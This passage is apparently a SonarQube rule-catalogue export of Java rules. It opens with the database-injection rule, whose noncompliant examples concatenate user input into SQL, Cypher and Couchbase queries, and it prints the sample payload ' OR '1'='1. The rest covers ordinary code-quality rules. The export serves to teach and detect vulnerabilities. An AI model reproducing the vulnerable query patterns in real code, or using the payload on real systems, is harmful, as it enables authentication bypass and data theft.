BeanPropertyRowMapper&lt;User&gt; userType = new BeanPropertyRowMapper(User.class);\n            User queryResult = jdbcTemplate.queryForObject(query, userType);\n\n        } catch (Exception e) {\n            return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    JdbcTemplate jdbcTemplate;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass)\n    {\n        String query = \"SELECT * FROM users WHERE user = ? AND pass = ?\";\n\n        try {\n            BeanPropertyRowMapper&lt;User&gt; userType = new BeanPropertyRowMapper(User.class);\n            User queryResult = jdbcTemplate.queryForObject(query, userType, user, pass);\n\n        } catch (Exception e) {\n            return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>How to fix it in Spring Data Neo4j</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Cypher injection because user-controlled data is inserted directly into a query string. The application assumes\nthat incoming data always has a specific range of characters, and ignores that some characters may change the query logic to a malicious one.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"41\" data-diff-type=\"noncompliant\">\nimport org.springframework.data.neo4j.core.Neo4jTemplate;\n\n@RestController\npublic class ApiController\n{\n    private final Neo4jTemplate neo4jTemplate;\n\n    @GetMapping(\"/find\")\n    public List&lt;Person&gt; find(@RequestParam(\"name\") String name) {\n        String cypherQuery = \"MATCH (n:Person) WHERE n.name = '\" + name + \"' RETURN n\";\n        return neo4jTemplate.findAll(cypherQuery, Person.class);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"41\" data-diff-type=\"compliant\">\nimport org.springframework.data.neo4j.core.Neo4jTemplate;\n\n@RestController\npublic class ApiController\n{\n    private final Neo4jTemplate neo4jTemplate;\n\n    @GetMapping(\"/find\")\n    public List&lt;Person&gt; find(@RequestParam(\"name\") String name) {\n        String cypherQuery = \"MATCH (n:Person) WHERE n.name = $name RETURN n\";\n        var parameters = new HashMap&lt;String, Object&gt;();\n        parameters.put(\"name\", name);\n        return neo4jTemplate.findAll(cypherQuery, parameters, Person.class);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context. For Neo4j, parameterized queries can securely and efficiently supply dynamic values to the query at the time of execution.</p>\n<h2>How to fix it in Hibernate</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\n' OR '1'='1\n</pre>\n<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query\nresult.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    QueryProducer queryProducer;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass)\n    {\n        String query = \"SELECT * FROM users WHERE user = '\" + user + \"' AND pass = '\" + pass + \"'\";\n\n        try {\n          queryProducer\n            .createNativeQuery(query)\n            .getSingleResult();\n\n        } catch (Exception e) {\n            return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    QueryProducer queryProducer;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass)\n    {\n        String query = \"SELECT * FROM users WHERE user = :user AND pass = :pass\";\n\n        try {\n          queryProducer\n            .createNativeQuery(query)\n            .setParameter(\"user\", user)\n            .setParameter(\"pass\", pass)\n            .getSingleResult();\n\n        } catch (Exception e) {\n            return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>How to fix it in Couchbase</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SQL++ injection because user-controlled data is inserted directly into a query string. The application assumes\nthat incoming data always has a specific range of characters, and ignores that some characters may change the query logic to a malicious one.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"noncompliant\">\nimport com.couchbase.client.java.Cluster;\n\n@RestController\npublic class ApiController\n{\n    private final Cluster couchbaseCluster;\n\n    @GetMapping(\"/find\")\n    public List&lt;Person&gt; find(@RequestParam(\"name\") String name) {\n        QueryResult result = couchbaseCluster.query(\"SELECT * FROM `bucket` WHERE name = '\" + name + \"'\");\n        return result.rowsAs(Person.class);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"compliant\">\norg.springframework.data.couchbase.core.query.Query;\n\n@RestController\npublic class ApiController\n{\n    private final CouchbaseTemplate couchbaseTemplate;\n\n    @GetMapping(\"/find\")\n    public List&lt;Person&gt; find(@RequestParam(\"name\") String name) {\n        Query query = Query.query(QueryCriteria.where(\"name\").eq(name));\n        return couchbaseTemplate.findByQuery(Person.class).matching(query).all();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p><code>QueryCriteria</code> is used to define the conditions of a query. It offers a fluent API to specify conditions on the fields of the documents\nyou are querying against.</p>\n<p>The <code>Query</code> class encapsulates the query defined by <code>QueryCriteria</code>. It allows for the specification of additional parameters\nfor the query, such as sorting and limit. The <code>Query</code> object is then used as an argument to the query methods provided by\nCouchbase-specific classes, like <code>CouchbaseTemplate</code>.</p>\n<p>One of the key advantages of using <code>Query</code> and <code>QueryCriteria</code> is the inherent security they provide. They help prevent\ninjection attacks by ensuring that user-provided input is properly escaped or parameterized, which prevents it from being interpreted as part of the\nquery itself. This is because these classes do not rely on string concatenation to build a query.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222607\">Application Security and\n  Development: V-222607</a> - The application must not be vulnerable to SQL Injection. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3649","summary":"Database queries should not be vulnerable to injection attacks","tags":["cwe","sql","android","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of\nperformance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use\n<em>that</em> list as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,\n<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nArrays.asList(1, 2, 3, 4).stream() // Noncompliant\n    .filter(...)\n    .forEach(...);\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nArrays.asList(\"a1\", \"a2\", \"b1\", \"c2\", \"c1\").stream()\n    .filter(...)\n    .forEach(...);\n\nint[] intArray = new int[]{1, 2, 3, 4};\nArrays.stream(intArray)\n    .filter(...)\n    .forEach(...);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3631","summary":"\"Arrays.stream\" should be used for primitive arrays","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Jump statements such as <code>return</code> and <code>continue</code> let you change the default flow of program execution, but jump statements\nthat direct the control flow to the original direction are just a waste of keystrokes.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (condition2) {\n      continue; // Noncompliant\n    } else {\n      doTheThing();\n    }\n  }\n  return; // Noncompliant; this is a void method\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void foo() {\n  while (condition1) {\n    if (!condition2) {\n      doTheThing();\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3626","summary":"Jump statements should not be redundant","tags":["redundant","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the instance of the owning object, its use can lead to\nmemory leaks if the anonymous inner class is returned and held by other objects. Even when thereâs no leak, DBI is so obscure that itâs bound to\nconfuse most maintainers.</p>\n<p>For collections, use <code>Arrays.asList</code> instead, or explicitly add each item directly to the collection.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nMap source = new HashMap(){{ // Noncompliant\n    put(\"firstName\", \"John\");\n    put(\"lastName\", \"Smith\");\n}};\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nMap source = new HashMap();\n// ...\nsource.put(\"firstName\", \"John\");\nsource.put(\"lastName\", \"Smith\");\n// ...\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3599","summary":"Double Brace Initialization should not be used","tags":["leak"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test method name does not match the provided\nregular expression.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default value: <code>^test[A-Z][a-zA-Z0-9]*$</code></p>\n<pre>\n@Test\npublic void foo() {  // Noncompliant\n  //...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\npublic void testFoo() {\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3578","summary":"Test methods should comply with a naming convention","tags":["convention","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a test class name does not match the provided\nregular expression.</p>\n<h3>Noncompliant code example</h3>\n<p>With the default value: <code>^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$</code></p>\n<pre>\nclass Foo {  // Noncompliant\n  @Test\n  void check() {  }\n}\n\nclass Bar {  // Noncompliant\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass FooTest {\n  @Test\n  void check() {  }\n}\n\nclass BarIT {\n  @Nested\n  class PositiveCase {\n    @Test\n    void check() {  }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3577","summary":"Test classes should comply with a naming convention","tags":["convention","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The Java language authors have been quite frank that <code>Optional</code> was intended for use only as a return type, as a way to convey that a\nmethod may or may not return a value.</p>\n<p>And for that, itâs valuable but using <code>Optional</code> on the input side increases the work you have to do in the method without really\nincreasing the value. With an <code>Optional</code> parameter, you go from having 2 possible inputs: null and not-null, to three: null,\nnon-null-without-value, and non-null-with-value. Add to that the fact that overloading has long been available to convey that some parameters are\noptional, and thereâs really no reason to have <code>Optional</code> parameters.</p>\n<p>The rule also checks for Guavaâs <code>Optional</code>, as it was the inspiration for the JDK <code>Optional</code>. Although it is different in\nsome aspects (serialization, being recommended for use as collection elements), using it as a parameter type causes exactly the same problems as for\nJDK <code>Optional</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic String sayHello(Optional&lt;String&gt; name) {  // Noncompliant\n  if (name == null || !name.isPresent()) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic String sayHello(String name) {\n  if (name == null) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>No issues will be raised if a method is overriding, as the developer has no control over the signature at this point.</p>\n<pre>\n@Override\npublic String sayHello(Optional&lt;String&gt; name) {\n  if (name == null || !name.isPresent()) {\n    return \"Hello World\";\n  } else {\n    return \"Hello \" + name;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3553","summary":"\"Optional\" should not be used for parameters","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When <code>@Overrides</code> of <code>synchronized</code> methods are not themselves <code>synchronized</code>, the result can be improper\nsynchronization as callers rely on the thread-safety promised by the parent class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n @Override\n  public void foo () {  // Noncompliant\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Parent {\n\n  synchronized void foo() {\n    //...\n  }\n}\n\npublic class Child extends Parent {\n\n  @Override\n  synchronized void foo () {\n    // ...\n    super.foo();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/gzdGBQ\">CERT, TSM00-J</a> - Do not override thread-safe methods with methods that are not\n  thread-safe </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3551","summary":"Overrides should match their parent class methods in synchronization","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Bug"},{"availability":["sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule\ntemplate allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom\nresources are leaked.</p>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S2095} - Resources should be closed </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3546","summary":"Custom resources should be closed","tags":["denial-of-service","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>If the denominator to an integer division or remainder operation is zero, a <code>ArithmeticException</code> is thrown.</p>\n<p>This error will crash your program in most cases. To fix it, you need to ensure that the denominator value in all division operations is always\nnon-zero, or check the value against zero before performing the division.</p>\n<h2>Why is this an issue?</h2>\n<p>A division (<code>/</code>) or remainder operation (<code>%</code>) by zero indicates a bug or logical error. This is because in Java, a division\nor remainder operation where the denominator is zero and not a floating point value always results in an <code>ArithmeticException</code> being\nthrown.</p>\n<h3>What is the potential impact?</h3>\n<p>Issues of this type interrupt the normal execution of a program, causing it to crash or putting it into an inconsistent state. Therefore, this\nissue might impact the availability and reliability of your application, or even result in data loss.</p>\n<p>If the computation of the denominator is tied to user input data, this issue can potentially even be exploited by attackers to disrupt your\napplication.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n  }\n  z = 1 / z; // Noncompliant, possible division by zero\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid test_divide() {\n  int z = 0;\n  if (unknown()) {\n    // ..\n    z = 3;\n  } else {\n    // ..\n    z = 1;\n  }\n  z = 1 / z;\n}\n</pre>\n<h3>Exceptions</h3>\n<p>No issue is raised when the denominator is the constant zero, as it is considered an intentional failure.</p>\n<p>When working with <code>double</code> or <code>float</code> values, no exception will be thrown, and the operation will result in special floating\npoint values representing either positive infinity, negative infinity, or <code>NaN</code>. Thus, the rule does not apply to floating point division\nor remainder operations.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/ArithmeticException.html\">ArithmeticException</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-15.html#jls-15.17.2\">The Division Operator in the JLS</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-15.html#jls-15.17.3\">The Remainder Operator in the JLS</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/369\">CWE-369 - Divide by zero</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/CTZGBQ\">CERT, NUM02-J.</a> - Ensure that division and remainder operations do not result in\n  divide-by-zero errors </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222612\">Application Security and\n  Development: V-222612</a> - The application must not be vulnerable to overflow attacks. </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-3518","summary":"Zero should not be a possible denominator","tags":["cwe","denial-of-service","cert","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>When a method is designed to return an invariant value, it may be poor design, but it shouldnât adversely affect the outcome of your program.\nHowever, when it happens on all paths through the logic, it is surely a bug.</p>\n<p>This rule raises an issue when a method contains several <code>return</code> statements that all return the same value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint foo(int a) {\n  int b = 12;\n  if (a == 1) {\n    return b;\n  }\n  return b;  // Noncompliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3516","summary":"Methods returns should not be invariant","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>printf-</code>-style format string is a string that contains placeholders, usually represented by special characters such as \"%s\" or \"{}\",\ndepending on the technology in use. These placeholders are replaced by values when the string is printed or logged.</p>\n<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that\nresult in the wrong strings being created.</p>\n<p>This rule checks whether every format string specifier can be correctly matched with one of the additional arguments when calling the following\nmethods:</p>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#format-java.lang.String-java.lang.Objectâ¦â-\"><code>java.lang.String#format</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/util/Formatter.html#format-java.lang.String-java.lang.Objectâ¦â-\"><code>java.util.Formatter#format</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/io/PrintStream.html#format-java.lang.String-java.lang.Objectâ¦â-\"><code>java.io.PrintStream#format</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/text/MessageFormat.html#format-java.lang.String-java.lang.Objectâ¦â-\"><code>java.text.MessageFormat#format</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/io/PrintWriter.html#format-java.lang.String-java.lang.Objectâ¦â-\"><code>java.io.PrintWriter#format</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/io/PrintStream.html#printf-java.lang.String-java.lang.Objectâ¦â-\"><code>java.io.PrintStream#printf</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/io/PrintWriter.html#printf-java.lang.String-java.lang.Objectâ¦â-\"><code>java.io.PrintWriter#printf</code></a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/String.html#formatted(java.lang.Objectâ¦â)\"><code>java.lang.String#formatted</code></a> (since Java 15) </li>\n  <li> logging methods of <a href=\"https://www.slf4j.org/api/org/slf4j/Logger.html\"><code>org.slf4j.Logger</code></a>, <a\n  href=\"https://docs.oracle.com/javase/8/docs/api/java/util/logging/Logger.html\"><code>java.util.logging.Logger</code></a>, <a\n  href=\"https://logging.apache.org/log4j/2.x/javadoc/log4j-api/org/apache/logging/log4j/Logger.html\"><code>org.apache.logging.log4j.Logger</code></a>.\n  </li>\n</ul>\n<h2>How to fix it</h2>\n<p>A <code>printf-</code>-style format string is a string that contains placeholders, which are replaced by values when the string is printed or\nlogged. Mismatch in the format specifiers and the arguments provided can lead to incorrect strings being created.</p>\n<p>To avoid issues, a developer should ensure that the provided arguments match format specifiers.</p>\n<p>Note that <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/text/MessageFormat.html\">MessageFormat</a> is used by most\nlogging mechanisms, for example <code>java.util.logging.Logger</code>, thus the <em>single quote</em> must be escaped by a <em>double single\nquote</em>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid logging(org.slf4j.Logger slf4jLog, java.util.logging.Logger logger) {\n    String.format(\"Too many arguments %d and %d\", 1, 2, 3); // Noncompliant - the third argument '3' is unused\n    String.format(\"First {0} and then {1}\", \"foo\", \"bar\");  //Noncompliant - it appears there is confusion with the use of \"java.text.MessageFormat\" - parameters \"foo\" and \"bar\" will be ignored here\n\n\n    slf4jLog.debug(\"The number: \", 1); // Noncompliant - String contains no format specifiers.\n\n    logger.log(level, \"Can't load library \\\"{0}\\\"!\", \"foo\"); // Noncompliant - the single quote ' must be escaped\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid logging(org.slf4j.Logger slf4jLog, java.util.logging.Logger logger) {\n    String.format(\"Too many arguments %d and %d\", 1, 2);\n    String.format(\"First %s and then %s\", \"foo\", \"bar\");\n\n    slf4jLog.debug(\"The number: {}\", 1);\n\n    logger.log(level, \"Can''t load library \\\"{0}\\\"!\", \"foo\");\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/J9YxBQ\">CERT, FIO47-C.</a> - Use valid format strings </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/text/MessageFormat.html\">java.text.MessageFormat</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3457","summary":"Format strings should be used 